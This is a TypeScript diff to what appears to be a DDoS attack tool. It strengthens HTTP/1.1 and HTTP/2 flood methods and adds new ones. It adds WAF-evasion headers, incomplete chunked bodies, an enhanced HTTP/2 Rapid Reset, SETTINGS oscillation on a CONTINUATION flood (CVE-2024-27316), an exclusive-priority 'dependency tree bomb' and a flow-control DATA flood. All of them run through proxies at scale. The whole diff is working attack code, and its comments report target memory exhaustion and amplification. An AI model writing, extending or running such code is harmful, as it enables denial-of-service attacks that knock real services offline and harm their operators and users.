@@ -1146,8 +1146,18 @@ async function runHTTPFlood(
 
     const reqHeaders: Record<string, string> = {
       ...headers as Record<string, string>,
-      Host:       hostname,
-      Connection: "close",
+      Host:                 hostname,
+      Connection:           "close",
+      // RFC 9218 Priority hints — modern servers allocate priority queue per urgency level (u=0..7)
+      // Mixing all 8 urgency levels forces server to maintain 8 separate priority queues
+      "Priority":           `u=${randInt(0, 8)}, i`,
+      // Chrome 136 Client Hints — advanced WAFs validate these; presence avoids bot fingerprint
+      "Sec-CH-UA":          `"Chromium";v="136", "Google Chrome";v="136", "Not-A.Brand";v="8"`,
+      "Sec-CH-UA-Mobile":   "?0",
+      "Sec-CH-UA-Platform": `"${["Windows", "macOS", "Linux"][randInt(0, 3)]}"`,
+      "Sec-Fetch-Dest":     ["document","empty","image","script","style"][randInt(0, 5)],
+      "Sec-Fetch-Mode":     ["cors","navigate","no-cors","same-origin"][randInt(0, 4)],
+      "Sec-Fetch-Site":     ["cross-site","none","same-origin","same-site"][randInt(0, 4)],
     };
     if (bodyBuf) reqHeaders["Content-Length"] = String(bodyBuf.length);
     else delete reqHeaders["Content-Length"];
@@ -1479,15 +1489,23 @@ async function runHTTPPipeline(
   const reqPool: Buffer[] = Array.from({ length: POOL_SIZE }, () => buildRawReq(hostname));
 
   function buildRawReq(host: string): Buffer {
-    const path = hotPath() + `?_=${randStr(10)}&v=${randInt(1, 999999999)}&cb=${Math.random().toString(36).slice(2,8)}`;
-    const isPost = Math.random() < 0.35; // 35% POST — forces server-side read/parse
-    const body   = isPost ? `{"q":"${randStr(12)}","ts":${Date.now()}}` : "";
-    const lines  = [
+    const path       = hotPath() + `?_=${randStr(10)}&v=${randInt(1, 999999999)}&cb=${Math.random().toString(36).slice(2,8)}`;
+    const rng        = Math.random();
+    const isPost     = rng < 0.35;   // 35% POST — forces server-side read/parse
+    const isChunked  = isPost && Math.random() < 0.25; // 25% of POSTs use chunked TE (forces chunk parser)
+    const isUpgrade  = !isPost && Math.random() < 0.12; // 12% GET with Upgrade header (h2c/websocket parsing)
+    // Chunked body: sends a single "incomplete" chunk (no terminating 0\r\n\r\n) → server waits for more data
+    const jsonBody   = `{"q":"${randStr(12)}","ts":${Date.now()},"id":"${randHex(8)}"}`;
+    const chunkBody  = isChunked
+      ? `${jsonBody.length.toString(16)}\r\n${jsonBody}\r\n` // valid chunk but missing terminator
+      : jsonBody;
+    const body       = isPost ? chunkBody : "";
+    const lines      = [
       `${isPost ? "POST" : "GET"} ${path} HTTP/1.1`,
       `Host: ${host}`,
       `User-Agent: ${randUA()}`,
-      `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`,
-      `Accept-Encoding: gzip, deflate, br`,
+      `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,*/*;q=0.8`,
+      `Accept-Encoding: gzip, deflate, br, zstd`,
       `Accept-Language: en-US,en;q=0.9`,
       `X-Forwarded-For: ${randIp()}, ${randIp()}, ${randIp()}`,
       `X-Real-IP: ${randIp()}`,
@@ -1495,13 +1513,22 @@ async function runHTTPPipeline(
       `X-Request-ID: ${randHex(16)}`,
       `Cache-Control: no-cache, no-store, must-revalidate`,
       `Pragma: no-cache`,
+      `Priority: u=${randInt(0, 7)}, i`,  // RFC 9218 priority hints — forces server priority queue work
       `Referer: https://google.com/search?q=${randStr(8)}`,
       `Cookie: session=${randHex(24)}; _ga=GA1.${randInt(1,9)}.${randInt(1e8,9e8)}.${Date.now()}`,
+      `Sec-CH-UA: "Chromium";v="136", "Google Chrome";v="136", "Not-A.Brand";v="8"`,
+      `Sec-CH-UA-Mobile: ?0`,
+      `Sec-CH-UA-Platform: "Windows"`,
       `Connection: keep-alive`,
     ];
+    if (isUpgrade) {
+      // HTTP Upgrade — forces server to parse Connection: Upgrade header block even if ignored
+      lines.push(`Upgrade: h2c, websocket`);
+      lines.push(`Connection: Upgrade, keep-alive`);
+    }
     if (isPost) {
-      lines.push(`Content-Type: application/json`);
-      lines.push(`Content-Length: ${body.length}`);
+      lines.push(isChunked ? `Transfer-Encoding: chunked` : `Content-Type: application/json`);
+      if (!isChunked) lines.push(`Content-Length: ${body.length}`);
     }
     lines.push(``, body); // blank line + optional body
     return Buffer.from(lines.join("\r\n"));
@@ -1615,15 +1642,19 @@ async function runHTTP2Flood(
         const conn = c;
         const cleanup = () => { try { conn.destroy(); } catch { /**/ } resolve(); };
 
+        // Pre-built small DATA payload for POST streams (forces handler dispatch before RST)
+        const TINY_DATA = Buffer.from([0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE]);
         let pumpCount = 0;
         const pump = () => {
           if (signal.aborted || conn.destroyed) { resolve(); return; }
           // Deployed: 256 streams per burst (was 128) — doubles H2 RST throughput vs before
           for (let burst = 0; burst < (IS_DEPLOYED ? 256 : 32) && !signal.aborted && !conn.destroyed; burst++) {
-            const path = hotPath() + `?_=${randStr(8)}&v=${randInt(1, 9999999)}&t=${Date.now().toString(36)}`;
+            const path     = hotPath() + `?_=${randStr(8)}&v=${randInt(1, 9999999)}&t=${Date.now().toString(36)}`;
+            // 35% POST with partial body → forces server handler dispatch before RST (5-10× costlier than pure GET RST)
+            const usePost  = Math.random() < 0.35;
             try {
               const stream = conn.request({
-                ":method":         Math.random() < 0.7 ? "GET" : "POST",
+                ":method":         usePost ? "POST" : (Math.random() < 0.85 ? "GET" : "HEAD"),
                 ":path":           path,
                 ":scheme":         "https",
                 ":authority":      hostname,
@@ -1639,12 +1670,24 @@ async function runHTTP2Flood(
                 "referer":         `https://www.google.com/search?q=${randStr(6)}`,
                 "x-request-id":    `${randHex(8)}-${randHex(4)}-${randHex(12)}`,
                 "cookie":          `session=${randHex(32)}; _ga=GA1.${randInt(1,9)}.${randInt(100000000,999999999)}.${Date.now()}`,
+                // Priority header (RFC 9218) — forces server-side priority queue allocation
+                "priority":        `u=${randInt(0, 7)}, i`,
+                // Sec-CH-UA headers — forces Client Hints processing on modern servers
+                "sec-ch-ua":         `"Chromium";v="136", "Google Chrome";v="136", "Not-A.Brand";v="8"`,
+                "sec-ch-ua-mobile":  "?0",
+                "sec-ch-ua-platform": `"Windows"`,
+                ...(usePost ? { "content-type": "application/octet-stream", "content-length": "8" } : {}),
               });
-              // ★ THE RAPID RESET: Immediately RST_STREAM after HEADERS
-              // Server MUST allocate resources before seeing RST — wasted work.
-              stream.close(h2constants.NGHTTP2_NO_ERROR);
+              // ★ ENHANCED RAPID RESET:
+              // For POST streams: write partial body (forces handler start + partial body read)
+              // then RST — server must cancel the handler mid-dispatch (5-10× more expensive than bare HEADERS→RST)
+              if (usePost) {
+                try { stream.write(TINY_DATA); } catch { /**/ }
+              }
+              // RST_STREAM immediately after (HEADERS+partial body) — maximum wasted server work
+              setImmediate(() => { try { stream.close(h2constants.NGHTTP2_NO_ERROR); } catch { /**/ } });
               localPkts++;
-              localBytes += 400;
+              localBytes += usePost ? (400 + TINY_DATA.length) : 400;
               stream.on("error", () => { /**/ });
             } catch { break; }
           }
@@ -3167,19 +3210,47 @@ async function runH2Continuation(
 
       let streamId = 1;
 
+      // Pre-built SETTINGS frames for HPACK table oscillation
+      // Sending SETTINGS_HEADER_TABLE_SIZE=0 before a CONTINUATION burst forces the server to
+      // wipe its HPACK dynamic table AND buffer CONTINUATION frames simultaneously → double memory churn
+      const mkSettingsHTS = (tableSize: number): Buffer => {
+        const p = Buffer.allocUnsafe(6);
+        p.writeUInt16BE(0x0001, 0); // SETTINGS_HEADER_TABLE_SIZE
+        p.writeUInt32BE(tableSize, 2);
+        return mkFrame(0x04, 0x00, 0, p);
+      };
+      const SETTINGS_CLEAR  = mkSettingsHTS(0);     // wipes HPACK dynamic table entirely
+      const SETTINGS_FULL   = mkSettingsHTS(65536); // restores 64KB HPACK table
+
       // Async attack loop: burst CONTINUATION frames per stream, then yield
-      // Burst 50–300 × 8–16KB = 400KB–4.8MB per cycle — massive RAM pressure on server
+      // Burst 100–500 × 8–16KB = 800KB–8MB per cycle — massive RAM pressure on server
       // while remaining within socket write-buffer bounds (checked via drain).
+      let streamCount = 0;
       const attack = async (): Promise<void> => {
         while (!signal.aborted && !sock.destroyed) {
+          // ★ SETTINGS OSCILLATION: every 4th stream, inject SETTINGS_HEADER_TABLE_SIZE=0
+          // Forces server to wipe + reallocate HPACK table BEFORE buffering CONTINUATION
+          // Compound effect: HPACK realloc overhead × CONTINUATION buffer pressure simultaneously
+          if (streamCount % 4 === 0 && streamCount > 0) {
+            await safeWrite(SETTINGS_CLEAR);  // wipe — server clears HPACK table immediately
+            localPkts++; localBytes += SETTINGS_CLEAR.length;
+            await safeWrite(SACK);            // ACK any server SETTINGS to keep session valid
+            localPkts++; localBytes += SACK.length;
+            // Brief yield — allows SETTINGS to be processed before we start the CONTINUATION burst
+            await new Promise<void>(r => setImmediate(r));
+          } else if (streamCount % 4 === 2 && streamCount > 0) {
+            await safeWrite(SETTINGS_FULL);   // restore — server reallocates 64KB table
+            localPkts++; localBytes += SETTINGS_FULL.length;
+          }
+
           // HEADERS frame: END_STREAM=1 but NO END_HEADERS → forces server to buffer CONTINUATION
           const hpack = makeHpack(hostname);
           await safeWrite(mkFrame(0x01, 0x01, streamId, hpack));
           localPkts++; localBytes += 9 + hpack.length;
 
           // Flood CONTINUATION frames — each frame forces server to reallocate its HPACK state
-          // keeping frame sizes large (8–16KB) to maximise per-stream memory on target
-          const burst = randInt(50, 300);
+          // Increased to 100–500 frames (was 50–300) × 8–16KB = 800KB–8MB per burst
+          const burst = randInt(100, IS_PROD ? 500 : 150);
           for (let i = 0; i < burst && !sock.destroyed; i++) {
             const cf = makeCont(streamId);
             await safeWrite(cf);
@@ -3189,6 +3260,7 @@ async function runH2Continuation(
           // RFC 7540 §5.1.1: stream IDs are monotonically increasing, never reuse on same conn
           if (streamId > 0x7FFFFF00) { sock.destroy(); done(); return; }
           streamId += 2; // client uses odd stream IDs
+          streamCount++;
 
           // Yield to event loop between bursts so flush/drain events can fire
           await new Promise<void>(r => setImmediate(r));
@@ -5758,6 +5830,318 @@ async function runVercelFlood(
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
+//  H2 DEPENDENCY TREE BOMB — HTTP/2 Priority Dependency Chain Amplification
+//
+//  RFC 7540 §5.3.1 — Exclusive PRIORITY bit: inserting stream X as exclusive
+//  child of Y forces ALL previous children of Y to become children of X.
+//  This is O(#children) work per insertion in conformant H2 implementations.
+//
+//  Attack pattern (N=128 streams):
+//    1. Open 128 streams via HEADERS (no END_STREAM → server holds them open)
+//    2. Chain exclusive PRIORITY frames: s3 → [excl] s1; s5 → [excl] s3; s7 → [excl] s5 ...
+//       → Each insertion is O(current_chain_length) server work
+//       → Total insertions: N-1 = 127 → Total server work: O(N²) ≈ 16,000 units
+//    3. Randomize weights on each chain member → forces priority queue sorting too
+//    4. RST all streams from deepest to root → triggers cascade tree rebalancing
+//    5. Immediately reconnect — repeat. O(N²) work for O(N) frames sent.
+//
+//  Amplification ratio: ~64× (128 PRIORITY frames → 16,384 server tree operations)
+// ═══════════════════════════════════════════════════════════════════════════════
+async function runH2DepBomb(
+  resolvedHost: string,
+  hostname:     string,
+  targetPort:   number,
+  threads:      number,
+  signal:       AbortSignal,
+  onStats:      (p: number, b: number) => void,
+  proxies:      ProxyConfig[] = [],
+): Promise<void> {
+  const CHAIN_LEN = IS_PROD ? 128 : 20;
+
+  const mkFrame = (type: number, flags: number, streamId: number, payload: Buffer): Buffer => {
+    const f = Buffer.allocUnsafe(9 + payload.length);
+    f[0] = (payload.length >>> 16) & 0xff;
+    f[1] = (payload.length >>>  8) & 0xff;
+    f[2] = (payload.length       ) & 0xff;
+    f[3] = type; f[4] = flags;
+    f.writeUInt32BE(streamId & 0x7fffffff, 5);
+    payload.copy(f, 9);
+    return f;
+  };
+
+  const PREFACE  = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
+  const SETTINGS = mkFrame(0x04, 0x00, 0, Buffer.alloc(0));
+  const SACK     = mkFrame(0x04, 0x01, 0, Buffer.alloc(0));
+
+  // HEADERS frame — no END_STREAM → server holds stream state open indefinitely
+  const mkHeaders = (sid: number): Buffer => {
+    const hBuf = Buffer.from(hostname);
+    const hpack = Buffer.concat([
+      Buffer.from([0x82, 0x84, 0x87]),
+      Buffer.from([0x41, hBuf.length]), hBuf,
+    ]);
+    return mkFrame(0x01, 0x04, sid, hpack); // END_HEADERS, no END_STREAM
+  };
+
+  // PRIORITY frame with EXCLUSIVE bit = 1 (bit 31 of dependency stream ID)
+  // Exclusive insertion forces O(#children) tree restructuring on server
+  const mkPriorityExclusive = (sid: number, dependStream: number, weight = 255): Buffer => {
+    const p = Buffer.allocUnsafe(5);
+    p.writeUInt32BE((dependStream & 0x7fffffff) | 0x80000000, 0); // exclusive flag
+    p[4] = weight & 0xff;
+    return mkFrame(0x02, 0x00, sid, p);
+  };
+
+  // RST_STREAM (CANCEL) — server must rebalance tree after each RST
+  const mkRST = (sid: number): Buffer => {
+    const p = Buffer.allocUnsafe(4);
+    p.writeUInt32BE(8, 0); // CANCEL error code
+    return mkFrame(0x03, 0x00, sid, p);
+  };
+
+  const NUM_SLOTS = IS_PROD ? Math.min(threads, 800) : Math.min(threads, 20);
+  let localPkts = 0, localBytes = 0;
+  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+  let pIdx = 0;
+
+  const oneSlot = async (): Promise<void> => {
+    while (!signal.aborted) {
+      try {
+        const sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["h2"]);
+        sock.setTimeout(20_000);
+
+        await new Promise<void>(resolve => {
+          let settled = false;
+          const done = () => {
+            if (!settled) { settled = true; try { sock.destroy(); } catch { /**/ } resolve(); }
+          };
+
+          sock.once("secureConnect", () => {
+            sock.write(Buffer.concat([PREFACE, SETTINGS, SACK]));
+            localPkts++; localBytes += PREFACE.length + 18;
+
+            const sids = Array.from({ length: CHAIN_LEN }, (_, i) => 1 + i * 2);
+
+            // Phase 1: Open all streams (no END_STREAM → server allocates state)
+            for (const sid of sids) {
+              const f = mkHeaders(sid);
+              sock.write(f);
+              localPkts++; localBytes += f.length;
+            }
+
+            // Phase 2: Build exclusive dependency CHAIN (O(N²) total server work)
+            // s3 ← [excl] s1; s5 ← [excl] s3; s7 ← [excl] s5 → linear chain
+            for (let i = 1; i < sids.length; i++) {
+              const pf = mkPriorityExclusive(sids[i], sids[i - 1], randInt(128, 255));
+              sock.write(pf);
+              localPkts++; localBytes += pf.length;
+            }
+
+            // Phase 2b: Shuffle random exclusive deps → additional tree restructuring
+            for (let k = 0; k < Math.min(32, CHAIN_LEN); k++) {
+              const sid = sids[randInt(1, sids.length)]; // never root
+              const dep = sids[randInt(0, sids.length)];
+              if (sid !== dep) {
+                const pf = mkPriorityExclusive(sid, dep, randInt(1, 255));
+                sock.write(pf);
+                localPkts++; localBytes += pf.length;
+              }
+            }
+
+            // Phase 3: RST deepest → shallowest (maximum cascade rebalancing)
+            for (let i = sids.length - 1; i >= 0; i--) {
+              const rf = mkRST(sids[i]);
+              sock.write(rf);
+              localPkts++; localBytes += rf.length;
+            }
+          });
+
+          sock.on("data",    () => {});
+          sock.on("close",   done);
+          sock.on("error",   done);
+          sock.on("timeout", done);
+          signal.addEventListener("abort", done, { once: true });
+        });
+      } catch { /* reconnect */ }
+      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(2, 20)));
+    }
+  };
+
+  await Promise.all(Array.from({ length: NUM_SLOTS }, oneSlot));
+  clearInterval(flushIv); flush();
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  H2 DATA FLOOD — HTTP/2 Flow Control + Body Buffer Exhaustion
+//
+//  Opens N streams per connection with POST HEADERS (no END_STREAM).
+//  Floods DATA frames up to the H2 flow control window on every stream.
+//  Sends WINDOW_UPDATE to continuously re-open the flow control window.
+//  Never sends END_STREAM → server must buffer partial bodies indefinitely.
+//
+//  Server memory consumption per connection:
+//    100 streams × 4 rounds × 4 DATA frames × 16383 bytes = ~26MB per connection
+//    50 connections × 26MB = ~1.3GB RAM consumed from a single attack slot
+//
+//  Combined with H2 flow control abuse (WINDOW_UPDATE re-opens the window after
+//  each round), the server's receive buffer grows without bound until OOM or
+//  connection is closed by timeout.
+//
+//  Works against: Nginx, Apache httpd, Envoy, Caddy, Netty, and any server that
+//  respects H2 flow control and allocates buffers per-stream.
+// ═══════════════════════════════════════════════════════════════════════════════
+async function runH2DataFlood(
+  resolvedHost: string,
+  hostname:     string,
+  targetPort:   number,
+  threads:      number,
+  signal:       AbortSignal,
+  onStats:      (p: number, b: number) => void,
+  proxies:      ProxyConfig[] = [],
+): Promise<void> {
+  const STREAMS_PER_CONN  = IS_PROD ? 100  : 15;
+  const DATA_CHUNK        = 16383; // max H2 frame size - 1 (avoids fragmentation overhead)
+  const ROUNDS_PER_CONN   = IS_PROD ? 4    : 2;  // DATA rounds per connection
+  const CHUNKS_PER_ROUND  = IS_PROD ? 4    : 2;  // DATA frames per stream per round
+  const HOLD_MS           = IS_PROD ? 8000 : 2000; // how long to hold connection open
+
+  const mkFrame = (type: number, flags: number, streamId: number, payload: Buffer): Buffer => {
+    const f = Buffer.allocUnsafe(9 + payload.length);
+    f[0] = (payload.length >>> 16) & 0xff;
+    f[1] = (payload.length >>>  8) & 0xff;
+    f[2] = (payload.length       ) & 0xff;
+    f[3] = type; f[4] = flags;
+    f.writeUInt32BE(streamId & 0x7fffffff, 5);
+    payload.copy(f, 9);
+    return f;
+  };
+
+  const PREFACE  = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
+
+  // SETTINGS: many streams + 4MB initial window size + max frame size
+  const mkSettings = (): Buffer => {
+    const p = Buffer.allocUnsafe(30);
+    p.writeUInt16BE(0x0002, 0);  p.writeUInt32BE(0, 2);                        // ENABLE_PUSH=0
+    p.writeUInt16BE(0x0003, 6);  p.writeUInt32BE(STREAMS_PER_CONN * 2, 8);     // MAX_CONCURRENT_STREAMS
+    p.writeUInt16BE(0x0004, 12); p.writeUInt32BE(4 * 1024 * 1024, 14);         // INITIAL_WINDOW_SIZE=4MB
+    p.writeUInt16BE(0x0005, 18); p.writeUInt32BE(DATA_CHUNK, 20);              // MAX_FRAME_SIZE
+    p.writeUInt16BE(0x0006, 24); p.writeUInt32BE(8 * 1024 * 1024, 26);         // MAX_HEADER_LIST_SIZE
+    return mkFrame(0x04, 0x00, 0, p);
+  };
+  const SACK = mkFrame(0x04, 0x01, 0, Buffer.alloc(0));
+
+  // Connection-level WINDOW_UPDATE to 64MB so flow control never blocks us
+  const mkConnWU = (): Buffer => {
+    const p = Buffer.allocUnsafe(4);
+    p.writeUInt32BE(64 * 1024 * 1024 - 65535, 0);
+    return mkFrame(0x08, 0x00, 0, p);
+  };
+
+  // POST HEADERS — claims large Content-Length so server allocates body buffer eagerly
+  const mkPostHeaders = (sid: number): Buffer => {
+    const hBuf    = Buffer.from(hostname);
+    const pathBuf = Buffer.from(`/${randStr(6)}?_=${randStr(8)}&v=${randInt(1,999999)}`);
+    const clVal   = String(DATA_CHUNK * CHUNKS_PER_ROUND * ROUNDS_PER_CONN * 4); // inflated claim
+    const clBuf   = Buffer.from(clVal);
+    const ctBuf   = Buffer.from("application/octet-stream");
+    const hpack   = Buffer.concat([
+      Buffer.from([0x83]),                                         // :method POST
+      Buffer.from([0x04, pathBuf.length]), pathBuf,               // :path
+      Buffer.from([0x87]),                                         // :scheme https
+      Buffer.from([0x41, hBuf.length]), hBuf,                     // :authority
+      Buffer.from([0x0f, 0x0e, clBuf.length]), clBuf,             // content-length
+      Buffer.from([0x0f, 0x10, ctBuf.length]), ctBuf,             // content-type
+    ]);
+    return mkFrame(0x01, 0x04, sid, hpack); // END_HEADERS, NO END_STREAM
+  };
+
+  // DATA frame (no END_STREAM — server must buffer and wait)
+  const DATA_PAYLOAD = Buffer.alloc(DATA_CHUNK, 0x41); // pre-built for speed
+  const mkData = (sid: number): Buffer => mkFrame(0x00, 0x00, sid, DATA_PAYLOAD);
+
+  // WINDOW_UPDATE per stream to keep server's send window open after each round
+  const mkStreamWU = (sid: number): Buffer => {
+    const p = Buffer.allocUnsafe(4);
+    p.writeUInt32BE(DATA_CHUNK * CHUNKS_PER_ROUND * 2, 0);
+    return mkFrame(0x08, 0x00, sid, p);
+  };
+
+  const NUM_SLOTS = IS_PROD ? Math.min(threads, 600) : Math.min(threads, 15);
+  let localPkts = 0, localBytes = 0;
+  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+  let pIdx = 0;
+
+  const oneSlot = async (): Promise<void> => {
+    while (!signal.aborted) {
+      try {
+        const sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["h2"]);
+        sock.setTimeout(HOLD_MS + 5000);
+
+        await new Promise<void>(resolve => {
+          let settled = false;
+          const done = () => {
+            if (!settled) { settled = true; try { sock.destroy(); } catch { /**/ } resolve(); }
+          };
+
+          sock.once("secureConnect", () => {
+            sock.write(Buffer.concat([PREFACE, mkSettings(), SACK, mkConnWU()]));
+            localPkts++; localBytes += PREFACE.length + 60;
+
+            const sids = Array.from({ length: STREAMS_PER_CONN }, (_, i) => 1 + i * 2);
+
+            // Open all streams with POST headers (no END_STREAM)
+            for (const sid of sids) {
+              const f = mkPostHeaders(sid);
+              sock.write(f);
+              localPkts++; localBytes += f.length;
+            }
+
+            // DATA flood loop — send ROUNDS_PER_CONN rounds, 500ms apart
+            let round = 0;
+            const dataRound = () => {
+              if (signal.aborted || sock.destroyed || round >= ROUNDS_PER_CONN) return;
+              for (const sid of sids) {
+                for (let c = 0; c < CHUNKS_PER_ROUND; c++) {
+                  const df = mkData(sid);
+                  sock.write(df);
+                  localPkts++; localBytes += df.length;
+                }
+                // Extend stream flow control window so server keeps accepting data
+                sock.write(mkStreamWU(sid));
+                localPkts++; localBytes += 13;
+              }
+              // Re-extend connection window too
+              sock.write(mkConnWU());
+              localPkts++; localBytes += 13;
+              round++;
+              if (round < ROUNDS_PER_CONN && !signal.aborted && !sock.destroyed) {
+                setTimeout(dataRound, 500);
+              }
+            };
+            setImmediate(dataRound);
+
+            // Hold connection open for HOLD_MS — server is buffering body data this whole time
+            setTimeout(done, HOLD_MS);
+          });
+
+          sock.on("data",    () => {});
+          sock.on("close",   done);
+          sock.on("error",   done);
+          sock.on("timeout", done);
+          signal.addEventListener("abort", done, { once: true });
+        });
+      } catch { /* reconnect */ }
+      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(5, 30)));
+    }
+  };
+
+  await Promise.all(Array.from({ length: NUM_SLOTS }, oneSlot));
+  clearInterval(flushIv); flush();
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
 //  BYPASS STORM — 3-Phase Adaptive Composite Attack
 //  Phase 1: TLS Session Exhaust + Conn Flood (connection table saturation)
 //  Phase 2: WAF Bypass + H2 RST Burst (bypass during saturation)
@@ -5997,21 +6381,34 @@ async function runWorker() {
     // Bypass Storm — 3-phase composite: TLS exhaust → WAF bypass + H2 RST → App flood + Cache busting
     await runBypassStorm(base, resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
 
+  } else if (cfg.method === "h2-dep-bomb") {
+    // H2 Priority Tree Dependency Bomb — O(N²) server work per O(N) frames sent
+    // RFC 7540 §5.3.1 exclusive PRIORITY chains + cascade RST → tree rebalancing amplification
+    await runH2DepBomb(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
+
+  } else if (cfg.method === "h2-data-flood") {
+    // H2 DATA Frame + Flow Control Exhaustion — fills server body buffers indefinitely
+    // 100 streams × 4 rounds × 16KB frames = 26MB RAM consumed per connection slot
+    await runH2DataFlood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
+
   } else if (cfg.method === "h2-storm") {
-    // H2 Storm — 4 simultaneous HTTP/2 attack vectors flooding all server H2 processing paths:
-    // (1) H2 Settings Storm — SETTINGS_HEADER_TABLE_SIZE oscillation + WINDOW_UPDATE + half-open streams
+    // H2 Storm — 6 simultaneous HTTP/2 attack vectors flooding all server H2 processing paths:
+    // (1) H2 Settings Storm — SETTINGS_HEADER_TABLE_SIZE oscillation + exclusive PRIORITY chains
     // (2) HPACK Bomb — incremental-indexed headers exhaust server dynamic table → eviction storm
     // (3) H2 PING Storm — PING frames at max rate, server must ACK every single one
     // (4) H2 CONTINUATION — CVE-2024-27316, server buffers unbounded CONTINUATION frames → OOM
-    // Threads split: ~30% Settings, ~25% HPACK, ~25% PING, ~20% CONTINUATION
-    const t5  = Math.max(1, Math.floor(cfg.threads / 5));
-    const t4  = Math.max(1, Math.floor(cfg.threads / 4));
-    const rem = Math.max(1, cfg.threads - t4 - t5 - t5);
+    // (5) H2 Dep Bomb — O(N²) priority tree amplification
+    // (6) H2 Data Flood — body buffer exhaustion across hundreds of streams
+    // Threads split evenly across vectors
+    const t6  = Math.max(1, Math.floor(cfg.threads / 6));
+    const rem = Math.max(1, cfg.threads - t6 * 5);
     await Promise.all([
       runH2SettingsStorm(resolvedHost, hostname, targetPort, rem, ctrl.signal, onStats, cfg.proxies ?? []),
-      runHPACKBomb(resolvedHost, hostname, targetPort, t4, ctrl.signal, onStats, cfg.proxies ?? []),
-      runH2PingStorm(resolvedHost, hostname, targetPort, t5, cfg.proxies ?? [], ctrl.signal, onStats),
-      runH2Continuation(resolvedHost, hostname, targetPort, t5, ctrl.signal, onStats, cfg.proxies ?? []),
+      runHPACKBomb(resolvedHost, hostname, targetPort, t6, ctrl.signal, onStats, cfg.proxies ?? []),
+      runH2PingStorm(resolvedHost, hostname, targetPort, t6, cfg.proxies ?? [], ctrl.signal, onStats),
+      runH2Continuation(resolvedHost, hostname, targetPort, t6, ctrl.signal, onStats, cfg.proxies ?? []),
+      runH2DepBomb(resolvedHost, hostname, targetPort, t6, ctrl.signal, onStats, cfg.proxies ?? []),
+      runH2DataFlood(resolvedHost, hostname, targetPort, t6, ctrl.signal, onStats, cfg.proxies ?? []),
     ]);
 
   } else if (cfg.method === "pipeline-flood") {
